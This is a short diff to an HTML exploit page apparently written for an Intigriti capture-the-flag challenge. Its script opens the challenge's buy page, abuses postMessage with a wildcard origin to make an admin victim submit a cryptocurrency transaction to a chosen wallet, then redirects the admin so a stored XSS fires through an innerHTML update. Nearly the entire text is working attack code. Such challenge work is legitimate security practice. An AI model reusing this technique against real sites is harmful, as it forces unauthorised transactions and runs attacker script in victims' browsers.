@@ -2,23 +2,21 @@
 <html>
 <body>
     <script>
-        // 1. Open the buy page for 1337COIN
+        // 1. Open the Marketplace/Buy page
         const win = window.open("https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1");
 
         setTimeout(() => {
-            // 2. Force the Admin to send a tiny bit of 1337COIN
-            // This ensures YOUR nickname appears at the top of the Marketplace
+            // 2. "Follow the trail": Force a transaction that connects YOU to the ADMIN
             win.postMessage({
                 type: 'submitTransaction',
                 transaction: {
-                    toAddress: '0x1337',
+                    toAddress: '1647db76b716157f954c706f74641a756f', // The Admin's wallet you found
                     currency: '1337COIN',
-                    amount: 0.00000001
+                    amount: 0.000001
                 }
             }, '*');
 
-            // 3. Redirect the Admin to the Marketplace
-            // This triggers the row.innerHTML = ... update which fires your XSS
+            // 3. Force the Admin to view the 'trail' (the transaction list)
             setTimeout(() => {
                 win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
             }, 2000);
